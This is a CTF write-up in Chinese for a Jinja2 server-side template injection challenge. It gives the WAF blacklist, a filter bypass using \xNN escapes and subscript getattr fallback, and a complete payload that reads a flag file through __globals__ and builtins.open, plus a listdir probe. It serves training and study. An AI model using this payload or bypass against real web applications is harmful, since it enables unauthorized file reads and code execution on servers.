# BabySSTI_Three — \xNN 转义绕词级 WAF + 下标 getattr 回退直取 builtins.open

赛事：DASCTF（NewStarCTF 系列第三题）
日期：2026-09-08
分类：Web / SSTI
难度：medium
Flag：CTF2{03454971-5f99-4f79-b733-b1ac1bb16b60}

## 题目

GET ?name=，Jinja2 SSTI，"Waf Has Been Updated Again"。

黑名单探测结论（拦 = "Get Out!Hacker!" 固定短语；页面 HTML 注释里也有 "Waf" 字样，grep 会误报）：

- 字符级：`_`、`"`、`+`、`~`、`{%`
- 词级：popen、flag、cat、system、builtins、eval、attr、init、mro、request、globals、url_for、get_flashed_messages
- 未拦：`'` 单引号、`.`、`[]`、`()`、`|`、os、read、open、get、import、join、exec、config、lipsum、cycler

## 解法：\xNN 转义 + [] 下标 getattr 回退

关键洞察：
1. Jinja2 字符串字面量支持 `'\x5f'` 转义，WAF 检测的是模板**原文**子串——
   转义后原文不含敏感词（globals/flag/builtins 全部可转义），词级 WAF 整体失效
2. `obj['attr']` 下标对对象有 getattr 回退（上次 EasySSTI 已知 dict 有；
   本题证明对一般对象同样有效），可连续下标走链，完全不需要 attr 过滤器

最终 payload（flag 文件名经 listdir 探明为 /flag_in_h3r3_52daad）：

```
{{lipsum['\x5f\x5fglob\x61ls\x5f\x5f']['\x5f\x5fbuilt\x69ns\x5f\x5f']['open']('\x2ffl\x61g\x5fin\x5fh3r3\x5f52d\x61\x61d').read()}}
```

等价 lipsum.__globals__['__builtins__'].open('/flag_in_h3r3_52daad').read()。
jinja2.utils 的 globals 无 os/sys（与 EasySSTI 环境不同），但有 __builtins__；
builtins.open 未被拦，直接读文件。

## 过程与坑

1. {{7*7}}→49 确认注入；{{1+1}} 拦出 "Get Out!Hacker!" 与页面注释 "Waf" 区分
2. 逐字符/词探测列黑名单（单字符探针 `"`、`+`、`~`、`{%`）
3. map('\x61ttr',…) 验证 \x 转义可行；发现 lipsum['__module__'] 直出 jinja2.utils，
   证明下标 getattr 回退可用，map/attr 都不需要
4. lipsum[os] 空返回曾误判失败——实际是 globals 里真没有 os（12595 字节 dump 实锤）
5. open('/flag') 500（FileNotFoundError 被静默）→ \x5f\x5fimport\x5f\x5f('os').listdir('/')
   探明 /flag_in_h3r3_52daad → 读出 flag

判定 WAF 是否命中看响应是否含 "Hacker"（15 字节 "Get Out!Hacker!"）；
空渲染（290 字节模板页）≠ 拦截 ≠ 500，三种状态要分开判读。
